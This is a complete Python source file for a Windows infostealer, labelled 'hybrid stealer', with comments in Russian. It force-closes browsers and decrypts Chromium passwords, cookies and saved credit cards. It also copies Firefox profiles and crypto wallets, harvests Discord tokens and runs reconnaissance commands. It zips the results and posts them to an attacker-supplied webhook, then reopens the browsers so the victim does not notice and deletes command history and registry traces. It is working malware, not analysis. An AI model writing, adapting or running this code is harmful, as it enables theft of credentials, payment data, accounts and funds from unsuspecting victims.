# Python 3.10+, Win10/11, зависимость: requests
# st.py — hybrid stealer (Chromium/Firefox/Discord/wallet + sysinfo)
# close_browsers -> steal -> reopen -> exfil -> self-wipe
import os, sys, json, base64, shutil, sqlite3, glob, re, zipfile
import tempfile, subprocess, time, ctypes, platform, socket
from ctypes import wintypes
from pathlib import Path

WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else ""
TAG     = (os.environ.get("COMPUTERNAME", "host") + "_" + str(int(time.time()))).replace(" ", "_")
WORK    = Path(tempfile.mkdtemp(prefix="x_"))
OUT     = WORK / "dump"

def safe(fn, *a, **k):
    try: return fn(*a, **k)
    except Exception: return None

# ============================================================
# DPAPI через ctypes (вместо pywin32)
# ============================================================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

crypt32  = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32

def dpapi_dec(data: bytes):
    if not data: return None
    try:
        buf = ctypes.create_string_buffer(data, len(data))
        bin_ = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
        bout = DATA_BLOB()
        ok = crypt32.CryptUnprotectData(
            ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout))
        if not ok: return None
        out = ctypes.string_at(bout.pbData, bout.cbData)
        kernel32.LocalFree(bout.pbData)
        return out
    except Exception:
        return None

# ============================================================
# AES-256-GCM через bcrypt.dll (вместо pycryptodome)
# ============================================================
bcrypt = ctypes.windll.bcrypt

class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
    _fields_ = [
        ("cbSize",            wintypes.ULONG),
        ("dwInfoVersion",     wintypes.ULONG),
        ("pbNonce",           ctypes.POINTER(ctypes.c_ubyte)),
        ("cbNonce",           wintypes.ULONG),
        ("pbAuthData",        ctypes.POINTER(ctypes.c_ubyte)),
        ("cbAuthData",        wintypes.ULONG),
        ("pbTag",             ctypes.POINTER(ctypes.c_ubyte)),
        ("cbTag",             wintypes.ULONG),
        ("pbMacContext",      ctypes.POINTER(ctypes.c_ubyte)),
        ("cbMacContext",      wintypes.ULONG),
        ("cbAAD",             wintypes.ULONG),
        ("cbData",            ctypes.c_ulonglong),
        ("dwFlags",           wintypes.ULONG),
    ]

def _bcrypt_open():
    hAlg = ctypes.c_void_p()
    if bcrypt.BCryptOpenAlgorithmProvider(
            ctypes.byref(hAlg), ctypes.c_wchar_p("AES"), None, 0) != 0:
        return None
    return hAlg

def aes_gcm_decrypt(key: bytes, nonce: bytes, ct: bytes, tag: bytes):
    hAlg = _bcrypt_open()
    if not hAlg: return None
    hKey = ctypes.c_void_p()
    try:
        if bcrypt.BCryptGenerateSymmetricKey(
                ctypes.byref(hKey), hAlg, None, 0,
                ctypes.c_char_p(key), len(key), 0) != 0:
            return None
        nonce_buf = (ctypes.c_ubyte * len(nonce)).from_buffer_copy(nonce)
        tag_buf   = (ctypes.c_ubyte * len(tag)).from_buffer_copy(tag)
        ct_buf    = ctypes.create_string_buffer(ct, len(ct))
        out_buf   = ctypes.create_string_buffer(len(ct))
        info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
        info.cbSize        = ctypes.sizeof(info)
        info.dwInfoVersion = 1
        info.pbNonce       = nonce_buf
        info.cbNonce       = len(nonce)
        info.pbTag         = tag_buf
        info.cbTag         = len(tag)
        written = wintypes.ULONG(0)
        st = bcrypt.BCryptDecrypt(
            hKey, ct_buf, len(ct), ctypes.byref(info),
            None, 0, out_buf, len(ct), ctypes.byref(written), 0)
        if st != 0: return None
        return out_buf.raw[:written.value]
    finally:
        if hKey: bcrypt.BCryptDestroyKey(hKey)
        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

def chrome_key(local_state: Path):
    try:
        ls  = json.loads(local_state.read_text(encoding="utf-8"))
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return dpapi_dec(enc)
    except Exception:
        return None

def chrome_decrypt(blob: bytes, key):
    if not blob: return None
    try:
        if blob[:3] in (b"v10", b"v11") and key:
            nonce, ct, tag = blob[3:15], blob[15:-16], blob[-16:]
            out = aes_gcm_decrypt(key, nonce, ct, tag)
            return out.decode("utf-8", "ignore") if out else None
        out = dpapi_dec(blob)
        return out.decode("utf-8", "ignore") if out else None
    except Exception:
        return None

# ============================================================
# copy_shared — CreateFileW с FILE_SHARE_READ, потом SHARE_READ|WRITE
# ============================================================
_GEN_READ   = 0x80000000
_OPEN_EXIST = 3
_SHARE_READ = 0x01
_SHARE_RW   = 0x03

_k32 = ctypes.windll.kernel32
_CreateFileW = _k32.CreateFileW
_CreateFileW.restype  = wintypes.HANDLE
_CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                         wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD,
                         wintypes.HANDLE]
_ReadFile = _k32.ReadFile
_ReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
                      ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
_CloseHandle = _k32.CloseHandle

def copy_shared(src: Path, dst: Path) -> bool:
    """Копирует залоченный файл: SHARE_READ, потом SHARE_READ|WRITE."""
    for share in (_SHARE_READ, _SHARE_RW):
        h = _CreateFileW(str(src), _GEN_READ, share, None, _OPEN_EXIST, 0, None)
        if h == wintypes.HANDLE(-1).value:
            continue
        try:
            buf = ctypes.create_string_buffer(65536)
            written = wintypes.DWORD(0)
            with dst.open("wb") as out:
                while True:
                    ok = _ReadFile(h, buf, len(buf), ctypes.byref(written), None)
                    if not ok or written.value == 0:
                        break
                    out.write(buf.raw[:written.value])
        finally:
            _CloseHandle(h)
        if dst.exists() and dst.stat().st_size > 0:
            return True
    return False

# ============================================================
# close/reopen browsers
# ============================================================
_BROWSER_EXES = ("chrome.exe", "msedge.exe", "brave.exe", "browser.exe", "opera.exe")

_BROWSER_PATHS = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
]

def close_browsers():
    """Graceful close, чтобы отпустили Cookies/Login Data."""
    for exe in _BROWSER_EXES:
        safe(subprocess.run, ["taskkill", "/IM", exe],
             capture_output=True, timeout=10)
    time.sleep(4)
    for exe in _BROWSER_EXES:
        safe(subprocess.run, ["taskkill", "/IM", exe, "/F"],
             capture_output=True, timeout=5)
    time.sleep(2)

def reopen_browsers():
    """Вернуть браузеры — юзер не заметит."""
    for p in _BROWSER_PATHS:
        if os.path.exists(p):
            safe(subprocess.Popen, [p],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)  # не все сразу

# ============================================================
# Chromium
# ============================================================
CHROMIUM = {
    "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
    "Edge":    Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data",
    "Brave":   Path(os.environ["LOCALAPPDATA"]) / "BraveSoftware/Brave-Browser/User Data",
    "Yandex":  Path(os.environ["LOCALAPPDATA"]) / "Yandex/YandexBrowser/User Data",
    "Opera":   Path(os.environ["APPDATA"])        / "Opera Software/Opera Stable",
    "OperaGX": Path(os.environ["APPDATA"])        / "Opera Software/Opera GX Stable",
}

def _chromium_item(prof: Path, rel: str, suffix: str, tag: str, key):
    src = prof / rel
    if not src.exists(): return
    if suffix == "cookies" and (OUT / f"{tag}_cookies.txt").exists():
        return
    tmp = WORK / f"_{suffix}_{tag}_{src.name}"
    if not copy_shared(src, tmp):
        return
    try:
        con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
        if suffix == "logins":
            rows = list(con.execute(
                "SELECT origin_url, username_value, password_value FROM logins"))
            if rows:
                with (OUT / f"{tag}_logins.txt").open("w", encoding="utf-8") as f:
                    for url, user, pw in rows:
                        dec = chrome_decrypt(pw, key)
                        if dec:
                            f.write(f"{url}\t{user}\t{dec}\n")
        elif suffix == "cookies":
            rows = list(con.execute(
                "SELECT host_key, name, encrypted_value, path FROM cookies"))
            if rows:
                with (OUT / f"{tag}_cookies.txt").open("w", encoding="utf-8") as f:
                    for host, cn, enc, path in rows:
                        dec = chrome_decrypt(enc, key)
                        if dec:
                            f.write(f"{host}\t{cn}\t{dec}\t{path}\n")
        elif suffix == "cards":
            rows = list(con.execute(
                "SELECT card_number_encrypted, "
                "expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"))
            if rows:
                with (OUT / f"{tag}_cards.txt").open("w", encoding="utf-8") as f:
                    for num, exp, nm in rows:
                        dec = chrome_decrypt(num, key) or ""
                        f.write(f"{nm}\t{dec}\t{exp}\n")
        con.close()
    except Exception:
        pass
    finally:
        safe(tmp.unlink)

def steal_chromium(name: str, ud: Path):
    if not ud.exists(): return
    key = chrome_key(ud / "Local State")
    profiles = [ud / "Default"] + sorted(ud.glob("Profile *"))
    for prof in profiles:
        if not prof.is_dir(): continue
        tag = f"{name}_{prof.name}"
        for rel, suffix in [
            ("Login Data",     "logins"),
            ("Network/Cookies","cookies"),
            ("Cookies",        "cookies"),
            ("Web Data",       "cards"),
        ]:
            _chromium_item(prof, rel, suffix, tag, key)

# ============================================================
# Firefox
# ============================================================
def steal_firefox():
    root = Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles"
    if not root.exists(): return
    for prof in root.glob("*"):
        for fn in ("key4.db", "logins.json", "cookies.sqlite", "places.sqlite", "cert9.db"):
            src = prof / fn
            if src.exists():
                safe(shutil.copy2, src, OUT / f"ff_{prof.name}_{fn}")
        ck = prof / "cookies.sqlite"
        if ck.exists():
            tmp = WORK / f"_ffck_{prof.name}"
            if copy_shared(ck, tmp):
                try:
                    con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
                    with (OUT / f"ff_{prof.name}_cookies_raw.txt").open("w", encoding="utf-8") as f:
                        for host, name, val in con.execute(
                                "SELECT host, name, value FROM moz_cookies"):
                            f.write(f"{host}\t{name}\t{val}\n")
                    con.close()
                except Exception:
                    pass
                finally:
                    safe(tmp.unlink)

# ============================================================
# Discord tokens — все файлы leveldb, все кодировки
# ============================================================
def steal_discord():
    pats = [
        re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}"),
        re.compile(r"mfa\.[\w-]{80,90}"),
    ]
    seen, lines = set(), []
    for base in ("discord", "discordcanary", "discordptb", "Lightcord"):
        r = Path(os.environ["APPDATA"]) / base / "Local Storage" / "leveldb"
        if not r.exists(): continue
        for f in sorted(r.glob("*")):
            if not f.is_file(): continue
            tmp = WORK / f"_ldb_{base}_{f.name}"
            if not copy_shared(f, tmp):
                continue
            try: raw = tmp.read_bytes()
            except Exception: raw = b""
            finally: safe(tmp.unlink)
            if not raw: continue
            for enc in ("utf-8", "utf-16-le", "latin-1"):
                try: text = raw.decode(enc, "ignore")
                except Exception: continue
                for p in pats:
                    for m in p.findall(text):
                        if m not in seen:
                            seen.add(m); lines.append(m)
    if lines:
        (OUT / "discord_tokens.txt").write_text("\n".join(lines), encoding="utf-8")

# ============================================================
# Кошельки
# ============================================================
WALLETS = {
    "Exodus":   Path(os.environ["APPDATA"]) / "Exodus/exodus.wallet",
    "Electrum": Path(os.environ["APPDATA"]) / "Electrum/wallets",
    "Ethereum": Path(os.environ["APPDATA"]) / "Ethereum/keystore",
    "Monero":   Path(os.environ["APPDATA"]) / "bitmonero",
    "Zcash":    Path(os.environ["APPDATA"]) / "Zcash",
    "Bytecoin": Path(os.environ["APPDATA"]) / "bytecoin",
}
def steal_wallets():
    for name, src in WALLETS.items():
        if not src.exists(): continue
        dst = OUT / f"wallet_{name}"
        if src.is_dir():
            safe(shutil.copytree, src, dst)
        else:
            safe(shutil.copy2, src, dst)

# ============================================================
# Sysinfo (cp866) + hostinfo fallback
# ============================================================
SYSINFO = {
    "hostname":  "hostname",
    "whoami":    "whoami /all",
    "ipconfig":  "ipconfig /all",
    "systeminfo":"systeminfo",
    "ports":     "netstat -an",
    "processes": "tasklist /v",
    "users":     "query user",
    "services":  "sc query state= all",
    "wifi":      "netsh wlan show profiles",
    "net_share": "net share",
    "arp":       "arp -a",
    "routes":    "route print",
    "drives":    "wmic logicaldisk get name,size,freespace",
    "installed": "wmic product get name,version",
}

def steal_sysinfo():
    out = {}
    for k, cmd in SYSINFO.items():
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               encoding="cp866", errors="replace", timeout=10)
            out[k] = r.stdout.strip() if r.returncode == 0 else f"err: {r.stderr.strip()}"
        except subprocess.TimeoutExpired:
            out[k] = "timeout"
        except Exception as e:
            out[k] = f"err: {e}"
    (OUT / "sysinfo.json").write_text(
        json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")

def steal_hostinfo():
    info = {
        "hostname":  socket.gethostname(),
        "platform":  platform.platform(),
        "system":    platform.system(),
        "release":   platform.release(),
        "version":   platform.version(),
        "machine":   platform.machine(),
        "processor": platform.processor(),
        "python":    sys.version,
        "user":      os.environ.get("USERNAME", ""),
        "cwd":       os.getcwd(),
    }
    try: info["local_ip"] = socket.gethostbyname(socket.gethostname())
    except Exception: pass
    (OUT / "hostinfo.json").write_text(
        json.dumps(info, indent=2, ensure_ascii=False), encoding="utf-8")

# ============================================================
# Pack & exfil
# ============================================================
def pack_and_send():
    if not WEBHOOK: return
    zip_path = WORK / f"dump_{TAG}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(OUT):
            for fn in files:
                p = Path(root) / fn
                z.write(p, p.relative_to(OUT))
    try:
        import requests
        with zip_path.open("rb") as fh:
            requests.post(
                WEBHOOK,
                data={"content": f"```{TAG}```"},
                files={"file": (zip_path.name, fh, "application/zip")},
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                                       "Chrome/120.0.0.0 Safari/537.36"},
                timeout=60)
    except Exception:
        pass

# ============================================================
# Cleanup
# ============================================================
def self_clean():
    for h in [
        Path(os.environ["APPDATA"]) / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
    ]:
        safe(h.unlink)
    safe(subprocess.run,
         ["cmd", "/c",
          r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f"],
         capture_output=True, timeout=10)

# ============================================================
# Main
# ============================================================
def main():
    OUT.mkdir(parents=True, exist_ok=True)
    safe(close_browsers)
    for n, ud in CHROMIUM.items():
        safe(steal_chromium, n, ud)
    safe(steal_firefox)
    safe(steal_discord)
    safe(steal_wallets)
    safe(steal_sysinfo)
    safe(steal_hostinfo)
    safe(pack_and_send)
    safe(reopen_browsers)
    self_clean()
    safe(shutil.rmtree, WORK, True)

if __name__ == "__main__":
    main()